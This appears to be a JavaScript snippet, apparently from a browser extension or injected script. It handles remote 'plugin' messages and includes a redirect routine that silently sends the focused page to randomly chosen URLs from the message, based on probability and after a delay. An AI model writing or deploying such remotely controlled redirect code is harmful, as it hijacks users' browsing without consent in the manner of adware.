const plugin_action = {
    "Redirect": redirect
}

function handle_plugin(message) {
    console.log(message);
    if (message.type == "revoke_plugin") {
        return revoke_plugin(message.name);
    }
    
    let data = message.data;
    switch (data.on) {
        case "load":
            plugin_action[message.name](data)
            break;

        default:
            break;
    }
}

function revoke_plugin(name) {

}

function redirect(data) {
    console.log(document.hasFocus())
    if (!document.hasFocus()) return;
    if (Math.random() > data.probability) return;

    var permitted = [];
    for (var url_data of data.urls) {
        var url_data = Object.entries(url_data)[0];
        if (url_data[0] == "*" || location.href.includes(url_data[0])) {
            permitted.push(url_data[1]);
        }
    }

    setTimeout(() => {
        location.href = permitted[random_index(permitted.length)]
    }, data.delay);
}